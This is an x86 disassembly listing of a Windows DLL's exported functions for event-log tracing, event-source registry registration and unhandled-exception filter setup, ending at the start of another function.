; Exported entry 724.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal724
Ordinal724	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	0C0000003h
		push	1
		call	Ordinal744
		retn
Ordinal724	endp

; Exported entry 725.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal725
Ordinal725	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	[ebp+arg_0], eax
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		push	1
		push	0C0000004h
		push	1
		call	Ordinal744
		pop	ebp
		retn	4
Ordinal725	endp

; Exported entry 726.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal726
Ordinal726	proc near		; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		push	2
		push	0C0000005h
		push	1
		call	Ordinal744
		leave
		retn	8
Ordinal726	endp

; Exported entry 727.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal727
Ordinal727	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	[ebp+arg_0], eax
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		push	1
		push	0C0000006h
		push	1
		call	Ordinal744
		pop	ebp
		retn	4
Ordinal727	endp

; Exported entry 728.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal728
Ordinal728	proc near		; DATA XREF: .rdata:off_6AF66098o

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_0]
		mov	[ebp+var_8], eax
		mov	eax, [ebp+arg_4]
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		push	2
		push	0C0000007h
		push	1
		call	Ordinal744
		leave
		retn	8
Ordinal728	endp

; Exported entry 729.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal729
Ordinal729	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	[ebp+arg_0], eax
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		push	1
		push	0C0000008h
		push	1
		call	Ordinal744
		pop	ebp
		retn	4
Ordinal729	endp

; Exported entry 730.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal730
Ordinal730	proc near		; CODE XREF: Ordinal1098+56p
					; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	40000010h
		push	4
		call	Ordinal744
		retn
Ordinal730	endp

; Exported entry 731.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal731
Ordinal731	proc near		; CODE XREF: Ordinal1099+36p
					; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	40000011h
		push	4
		call	Ordinal744
		retn
Ordinal731	endp

; Exported entry 732.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal732
Ordinal732	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	4000000Eh
		push	4
		call	Ordinal744
		retn
Ordinal732	endp

; Exported entry 733.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal733
Ordinal733	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	4000000Fh
		push	4
		call	Ordinal744
		retn
Ordinal733	endp

; Exported entry 734.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal734
Ordinal734	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	40000012h
		push	4
		call	Ordinal744
		retn
Ordinal734	endp

; Exported entry 735.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal735
Ordinal735	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	40000013h
		push	4
		call	Ordinal744
		retn
Ordinal735	endp

; Exported entry 736.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal736
Ordinal736	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	0C0000017h
		push	1
		call	Ordinal744
		retn
Ordinal736	endp

; Exported entry 737.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal737
Ordinal737	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	[ebp+arg_0], eax
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		lea	eax, [ebp+arg_0]
		push	eax
		push	1
		push	0C0000018h
		push	1
		call	Ordinal744
		pop	ebp
		retn	4
Ordinal737	endp

; Exported entry 738.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal738
Ordinal738	proc near		; DATA XREF: .rdata:off_6AF66098o
		xor	eax, eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	eax
		push	0C0000019h
		push	1
		call	Ordinal744
		retn
Ordinal738	endp

; Exported entry 714.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal714(int,	char *Format, va_list Args)
		public Ordinal714
Ordinal714	proc near		; CODE XREF: Ordinal715+Fp
					; Ordinal716+Fp ...

var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= byte ptr -50h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
Format		= dword	ptr  0Ch
Args		= dword	ptr  10h

		mov	eax, offset unknown_libname_79 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 4Ch
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_2C], ecx
		lea	ecx, [ebp+var_28]
		mov	[ebp+var_14], eax
		mov	[ebp+var_10], esp
		call	sub_6AF318C3
		xor	esi, esi
		push	offset aCeventlogTrace ; "CEventLog::TraceV()"
		lea	ecx, [ebp+var_50]
		mov	[ebp+var_4], esi
		call	Ordinal751
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_28]
		push	[ebp+Format]	; Format
		mov	byte ptr [ebp+var_4], 2
		call	sub_6AF31BF4
		jmp	loc_6AF43900
; ---------------------------------------------------------------------------

loc_6AF43866:				; DATA XREF: .rdata:6AF63420o
		push	13h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	ecx, [ebp+var_54]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF438FE
		retn
; ---------------------------------------------------------------------------

loc_6AF438A9:				; DATA XREF: .rdata:6AF63430o
		push	15h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	eax, [ebp+var_58]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF438FE
		retn
; ---------------------------------------------------------------------------

loc_6AF438FE:				; DATA XREF: Ordinal714+8Co
					; Ordinal714+E1o
		xor	esi, esi

loc_6AF43900:				; CODE XREF: Ordinal714+4Aj
		xor	edi, edi
		inc	edi
		lea	ecx, [ebp+var_50]
		mov	[ebp+var_4], edi
		call	Ordinal753
		test	eax, eax
		jnz	short loc_6AF43940
		push	offset pszTrimChars ; "\r\n"
		lea	ecx, [ebp+var_28]
		call	sub_6AF3B17D
		mov	eax, [ebp+var_28]
		mov	ecx, [ebp+var_2C]
		push	esi
		push	esi
		push	esi
		push	esi
		mov	[ebp+var_30], eax
		lea	eax, [ebp+var_30]
		push	eax
		push	edi
		push	8000000Dh
		push	[ebp+arg_0]
		call	Ordinal744
		mov	esi, eax

loc_6AF43940:				; CODE XREF: Ordinal714+F9j
		lea	ecx, [ebp+var_50]
		call	Ordinal752
		mov	ecx, [ebp+var_28]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal714	endp ; sp-analysis failed

; Exported entry 715.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal715(int, char *Format, char Args)
		public Ordinal715
Ordinal715	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		push	4		; int
		call	Ordinal714
		retn
Ordinal715	endp

; Exported entry 716.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal716(int, char *Format, char Args)
		public Ordinal716
Ordinal716	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		push	2		; int
		call	Ordinal714
		retn
Ordinal716	endp

; Exported entry 717.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal717(int, char *Format, char Args)
		public Ordinal717
Ordinal717	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		push	1		; int
		call	Ordinal714
		retn
Ordinal717	endp

; Exported entry 718.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal718(int, char *Format, char Args)
		public Ordinal718
Ordinal718	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		push	8		; int
		call	Ordinal714
		retn
Ordinal718	endp

; Exported entry 719.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal719(int, char *Format, char Args)
		public Ordinal719
Ordinal719	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
Format		= dword	ptr  8
Args		= byte ptr  0Ch

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		push	10h		; int
		call	Ordinal714
		retn
Ordinal719	endp

; Exported entry 713.

; =============== S U B	R O U T	I N E =======================================


; int __cdecl Ordinal713(int, int, char	*Format, char Args)
		public Ordinal713
Ordinal713	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
Format		= dword	ptr  0Ch
Args		= byte ptr  10h

		mov	ecx, [esp+arg_0]
		lea	eax, [esp+Args]
		push	eax		; Args
		push	[esp+4+Format]	; Format
		push	[esp+8+arg_4]	; int
		call	Ordinal714
		retn
Ordinal713	endp

; Exported entry 707.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal707(char	*pszSubKey, LPCSTR lpData, BYTE	Data)
		public Ordinal707
Ordinal707	proc near		; CODE XREF: Ordinal1074+529p
					; DATA XREF: .rdata:off_6AF66098o

var_B0		= byte ptr -0B0h
var_6C		= byte ptr -6Ch
var_60		= dword	ptr -60h
var_5C		= dword	ptr -5Ch
var_58		= byte ptr -58h
var_38		= dword	ptr -38h
var_34		= byte ptr -34h
Args		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Str		= dword	ptr  8
lpData		= dword	ptr  0Ch
Data		= byte ptr  10h

		mov	eax, offset unknown_libname_80 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 0A4h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	esi, ecx
		xor	edi, edi
		push	edi
		mov	[ebp+var_14], eax
		push	0FFFFFFFFh
		lea	eax, [esi+24h]
		push	eax
		lea	ecx, [ebp+var_6C]
		mov	[ebp+var_38], esi
		call	Ordinal1228
		push	[ebp+Str]	; pszSubKey
		mov	ecx, esi
		mov	[ebp+var_4], edi
		call	Ordinal708
		lea	ecx, [ebp+var_B0]
		call	Ordinal1163
		cmp	[ebp+lpData], edi
		mov	byte ptr [ebp+var_4], 1
		jnz	short loc_6AF43A73
		push	edi		; Args
		lea	ecx, [ebp+var_B0]
		call	Ordinal1165
		test	eax, eax
		jnz	short loc_6AF43A65
		push	offset aCeventlogRegis ; "CEventLog::Register()	: path.SplitPath("...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	loc_6AF43BD9
; ---------------------------------------------------------------------------

loc_6AF43A65:				; CODE XREF: Ordinal707+63j
		lea	ecx, [ebp+var_B0]
		call	Ordinal1118
		mov	[ebp+lpData], eax

loc_6AF43A73:				; CODE XREF: Ordinal707+53j
		lea	ecx, [ebp+Args]
		call	sub_6AF318C3
		push	offset aCeventlogReg_0 ; "CEventLog::Register()"
		lea	ecx, [ebp+var_58]
		call	Ordinal751
		push	offset Src	; "SYSTEM\\CurrentControlSet\\Services\\Event"...
		lea	ecx, [ebp+Args]
		mov	byte ptr [ebp+var_4], 4
		call	sub_6AF31B1D
		push	[ebp+Str]	; Str
		lea	ecx, [ebp+Args]
		call	sub_6AF3B24F
		jmp	loc_6AF43B44
; ---------------------------------------------------------------------------

loc_6AF43AA9:				; DATA XREF: .rdata:6AF634A0o
		push	13h
		lea	ecx, [ebp+var_58]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_58]
		call	Ordinal762
		mov	ecx, [ebp+var_60]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_58]
		call	Ordinal764
		lea	ecx, [ebp+var_58]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF43B41
		retn
; ---------------------------------------------------------------------------

loc_6AF43AEC:				; DATA XREF: .rdata:6AF634B0o
		push	15h
		lea	ecx, [ebp+var_58]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_58]
		call	Ordinal762
		mov	eax, [ebp+var_5C]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_58]
		call	Ordinal764
		lea	ecx, [ebp+var_58]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF43B41
		retn
; ---------------------------------------------------------------------------

loc_6AF43B41:				; DATA XREF: Ordinal707+F8o
					; Ordinal707+14Do
		mov	esi, [ebp+var_38]

loc_6AF43B44:				; CODE XREF: Ordinal707+B6j
		lea	ecx, [ebp+var_58]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF43B54
		xor	esi, esi
		jmp	short loc_6AF43BC6
; ---------------------------------------------------------------------------

loc_6AF43B54:				; CODE XREF: Ordinal707+160j
		lea	ecx, [ebp+var_34]
		call	Ordinal988
		push	1		; int
		push	20006h		; samDesired
		push	[ebp+Args]	; Args
		lea	ecx, [ebp+var_34]
		push	80000002h	; hKey
		call	Ordinal993
		test	eax, eax
		jz	short loc_6AF43BA6
		push	2		; dwType
		push	[ebp+lpData]	; lpData
		lea	ecx, [ebp+var_34]
		push	offset aEventmessagefi ; "EventMessageFile"
		call	Ordinal1005
		test	eax, eax
		jz	short loc_6AF43BA6
		push	dword ptr [ebp+Data] ; Data
		lea	ecx, [ebp+var_34]
		push	offset aTypessupported ; "TypesSupported"
		call	Ordinal1009
		test	eax, eax
		jz	short loc_6AF43BA6
		xor	esi, esi
		inc	esi
		jmp	short loc_6AF43BBE
; ---------------------------------------------------------------------------

loc_6AF43BA6:				; CODE XREF: Ordinal707+187j
					; Ordinal707+19Dj ...
		push	offset aCeventlogReg_1 ; "CEventLog::Register()	: reg.Open() ==	F"...
		call	sub_6AF3102E
		pop	ecx
		lea	ecx, [ebp+var_34]
		call	Ordinal236
		mov	[esi+8], eax
		xor	esi, esi

loc_6AF43BBE:				; CODE XREF: Ordinal707+1B6j
		lea	ecx, [ebp+var_34]
		call	Ordinal990

loc_6AF43BC6:				; CODE XREF: Ordinal707+164j
		lea	ecx, [ebp+var_58]
		call	Ordinal752
		mov	ecx, [ebp+Args]
		add	ecx, 0FFFFFFF0h
		call	sub_6AF3160D

loc_6AF43BD9:				; CODE XREF: Ordinal707+72j
		lea	ecx, [ebp+var_B0]
		call	Ordinal1164
		lea	ecx, [ebp+var_6C]
		call	Ordinal1230
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		mov	eax, esi
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	0Ch
Ordinal707	endp ; sp-analysis failed

; Exported entry 745.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal745
Ordinal745	proc near		; CODE XREF: Ordinal551+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5C1A8
		mov	dword_6AF68258,	eax
		retn
Ordinal745	endp

; Exported entry 748.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal748
Ordinal748	proc near		; CODE XREF: Ordinal563+2Bp
					; Ordinal746+6p ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+8], 0
		jz	short loc_6AF43C33
		push	dword ptr [esi+4] ; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		and	dword ptr [esi+4], 0

loc_6AF43C33:				; CODE XREF: Ordinal748+7j
		and	dword ptr [esi+8], 0
		pop	esi
		retn
Ordinal748	endp

; Exported entry 749.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal749
Ordinal749	proc near		; CODE XREF: Ordinal553+26p
					; DATA XREF: .rdata:6AF5C1ACo ...
		mov	eax, [ecx+4]
		test	eax, eax
		jz	short loc_6AF43C42
		jmp	eax
; ---------------------------------------------------------------------------

loc_6AF43C42:				; CODE XREF: Ordinal749+5j
		xor	eax, eax
		retn	4
Ordinal749	endp


; =============== S U B	R O U T	I N E =======================================


; LONG __stdcall TopLevelExceptionFilter(struct	_EXCEPTION_POINTERS *)
TopLevelExceptionFilter	proc near	; DATA XREF: Ordinal747+8o
		mov	ecx, dword_6AF68258
		test	ecx, ecx
		jz	short loc_6AF43C56
		mov	eax, [ecx]
		jmp	dword ptr [eax+4]
; ---------------------------------------------------------------------------

loc_6AF43C56:				; CODE XREF: TopLevelExceptionFilter+8j
		xor	eax, eax
		retn	4
TopLevelExceptionFilter	endp

; Exported entry 746.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal746
Ordinal746	proc near		; CODE XREF: Ordinal552+6j
					; sub_6AF43C8C+3p
					; DATA XREF: ...
		mov	dword ptr [ecx], offset	off_6AF5C1A8
		call	Ordinal748
		and	dword_6AF68258,	0
		retn
Ordinal746	endp

; Exported entry 747.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal747
Ordinal747	proc near		; CODE XREF: Ordinal562+1F9p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal748
		push	offset TopLevelExceptionFilter ; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		mov	[esi+4], eax
		xor	eax, eax
		inc	eax
		mov	[esi+8], eax
		pop	esi
		retn
Ordinal747	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF43C8C(void *, char)
sub_6AF43C8C	proc near		; DATA XREF: .rdata:off_6AF5C1A8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal746
		test	[esp+4+arg_0], 1
		jz	short loc_6AF43CA2
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF43CA2:				; CODE XREF: sub_6AF43C8C+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF43C8C	endp

; Exported entry 753.
; Exported entry 900.
; Exported entry 1298.
; Exported entry 1309.
; Exported entry 1325.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal753
Ordinal753	proc near		; CODE XREF: Ordinal148+1F1p
					; Ordinal150+60p ...
		xor	eax, eax	; ccL30_753
					; ccL30_900
					; ccL30_1298
					; ccL30_1309
		cmp	[ecx+4], eax
		setnz	al
		retn
Ordinal753	endp

; Exported entry 760.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal760
Ordinal760	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	[ecx+18h], eax
		retn	4
Ordinal760	endp

; Exported entry 752.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal752
Ordinal752	proc near		; CODE XREF: Ordinal148+1FDp
					; Ordinal148:loc_6AF324A3p ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+1Ch]
		mov	dword ptr [esi], offset	off_6AF5C1B0
		call	sub_6AF3789B
		lea	ecx, [esi+14h]
		call	sub_6AF3789B
		lea	ecx, [esi+10h]
		call	sub_6AF3789B
		lea	ecx, [esi+0Ch]
		pop	esi
		jmp	sub_6AF3789B
Ordinal752	endp

; Exported entry 754.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal754
Ordinal754	proc near		; CODE XREF: Ordinal1074+1EEp
					; Ordinal1074+3BFp
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+18h], 0
		and	dword ptr [esi+4], 0
		lea	ecx, [esi+0Ch]
		call	sub_6AF317A8
		lea	ecx, [esi+10h]
		call	sub_6AF317A8
		lea	ecx, [esi+1Ch]
		call	sub_6AF317A8
		lea	ecx, [esi+14h]
		pop	esi
		jmp	sub_6AF317A8
Ordinal754	endp

; Exported entry 751.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal751
Ordinal751	proc near		; CODE XREF: Ordinal148+115p
					; Ordinal150+23p ...

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF5C1B0
		mov	[esi+8], eax
		call	sub_6AF318C3
		lea	ecx, [esi+10h]
		call	sub_6AF318C3
		lea	ecx, [esi+14h]
		call	sub_6AF318C3
		and	dword ptr [esi+18h], 0
		lea	ecx, [esi+1Ch]
		call	sub_6AF318C3
		mov	eax, esi
		pop	esi
		retn	4
Ordinal751	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF43D4F(void *, char)
sub_6AF43D4F	proc near		; DATA XREF: .rdata:off_6AF5C1B0o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal752
		test	[esp+4+arg_0], 1
		jz	short loc_6AF43D65
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF43D65:				; CODE XREF: sub_6AF43D4F+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF43D4F	endp

; Exported entry 765.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal765(LPCWSTR lpWideCharStr)
		public Ordinal765
Ordinal765	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
lpWideCharStr	= dword	ptr  8

		mov	eax, offset unknown_libname_81 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+lpWideCharStr] ; lpWideCharStr
		add	ecx, 10h
		call	sub_6AF381EE

loc_6AF43D8B:				; DATA XREF: sub_6AF43D9Co
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	4
Ordinal765	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF43D9C	proc near		; DATA XREF: .rdata:stru_6AF634F4o
		mov	eax, offset loc_6AF43D8B
		retn
sub_6AF43D9C	endp

; Exported entry 767.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal767
Ordinal767	proc near		; CODE XREF: Ordinal148+17Ep
					; Ordinal148+1D3p ...

var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_82 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	eax, [esi+14h]
		mov	ecx, [esi+10h]
		mov	edx, [esi+0Ch]
		mov	[ebp+var_10], esp
		push	dword ptr [esi+18h]
		mov	[ebp+var_14], esi
		push	eax
		push	ecx
		push	edx
		push	dword ptr [esi+8] ; Args
		lea	eax, [esi+1Ch]
		push	offset aSSSSLd	; "%s, %s, %s, %s (%ld)"
		push	eax		; int
		call	sub_6AF3217C
		add	esp, 1Ch
		jmp	short loc_6AF43DEB
; ---------------------------------------------------------------------------

loc_6AF43DE2:				; DATA XREF: .rdata:stru_6AF63544o
		mov	eax, offset loc_6AF43DE8
		retn
; ---------------------------------------------------------------------------

loc_6AF43DE8:				; DATA XREF: Ordinal767:loc_6AF43DE2o
		mov	esi, [ebp+var_14]

loc_6AF43DEB:				; CODE XREF: Ordinal767+3Ej
		mov	eax, [esi+1Ch]
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn
Ordinal767	endp

; Exported entry 758.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal758(char	*Src)
		public Ordinal758
Ordinal758	proc near		; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Src		= dword	ptr  8

		mov	eax, offset unknown_libname_83 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		push	ecx
		and	[ebp+var_4], 0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		push	[ebp+Src]	; Src
		add	ecx, 14h
		call	sub_6AF31B1D

loc_6AF43E1D:				; DATA XREF: sub_6AF43E2Eo
		mov	ecx, [ebp+var_C]
		pop	edi
		pop	esi
		mov	large fs:0, ecx
		pop	ebx
		leave
		retn	4
Ordinal758	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF43E2E	proc near		; DATA XREF: .rdata:stru_6AF63594o
		mov	eax, offset loc_6AF43E1D
		retn
sub_6AF43E2E	endp

; Exported entry 762.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

